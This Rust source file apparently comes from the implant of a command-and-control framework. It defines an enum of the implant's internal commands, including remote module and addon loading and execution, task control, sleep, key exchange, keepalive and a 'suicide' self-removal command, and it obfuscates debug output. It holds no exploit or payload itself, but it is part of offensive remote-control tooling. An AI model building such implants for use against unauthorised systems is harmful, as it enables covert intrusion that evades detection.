use malefic_gateway::ObfDebug;
use strum_macros::{Display, EnumString};

#[derive(ObfDebug, EnumString, Display)]
pub enum InternalModule {
    #[strum(serialize = "ping")]
    Ping,
    #[strum(serialize = "init")]
    Init,
    #[strum(serialize = "refresh_module")]
    RefreshModule,
    #[strum(serialize = "list_module")]
    ListModule,
    #[cfg(feature = "hot_load")]
    #[strum(serialize = "load_module")]
    LoadModule,
    #[cfg(feature = "hot_load")]
    #[strum(serialize = "unload_module")]
    UnloadModule,
    #[cfg(feature = "addon")]
    #[strum(serialize = "load_addon")]
    LoadAddon,
    #[cfg(feature = "addon")]
    #[strum(serialize = "list_addon")]
    ListAddon,
    #[cfg(feature = "addon")]
    #[strum(serialize = "execute_addon")]
    ExecuteAddon,
    #[cfg(feature = "addon")]
    #[strum(serialize = "refresh_addon")]
    RefreshAddon,
    #[strum(serialize = "clear")]
    Clear,
    #[strum(serialize = "cancel_task")]
    CancelTask,
    #[strum(serialize = "query_task")]
    QueryTask,
    #[strum(serialize = "list_task")]
    ListTask,
    #[strum(serialize = "sleep")]
    Sleep,
    #[strum(serialize = "suicide")]
    Suicide,
    #[strum(serialize = "switch")]
    Switch,
    #[strum(serialize = "key_exchange")]
    KeyExchange,
    #[strum(serialize = "keepalive")]
    KeepAlive,
}

impl InternalModule {
    pub fn all() -> Vec<String> {
        vec![
            InternalModule::Ping,
            InternalModule::Init,
            InternalModule::RefreshModule,
            InternalModule::ListModule,
            #[cfg(feature = "hot_load")]
            InternalModule::LoadModule,
            #[cfg(feature = "hot_load")]
            InternalModule::UnloadModule,
            #[cfg(feature = "addon")]
            InternalModule::LoadAddon,
            #[cfg(feature = "addon")]
            InternalModule::ListAddon,
            #[cfg(feature = "addon")]
            InternalModule::ExecuteAddon,
            #[cfg(feature = "addon")]
            InternalModule::RefreshAddon,
            InternalModule::Clear,
            InternalModule::CancelTask,
            InternalModule::QueryTask,
            InternalModule::ListTask,
            InternalModule::Sleep,
            InternalModule::Suicide,
            InternalModule::Switch,
            InternalModule::KeyExchange,
            InternalModule::KeepAlive,
        ]
        .into_iter()
        .map(|m| m.to_string())
        .collect()
    }
}
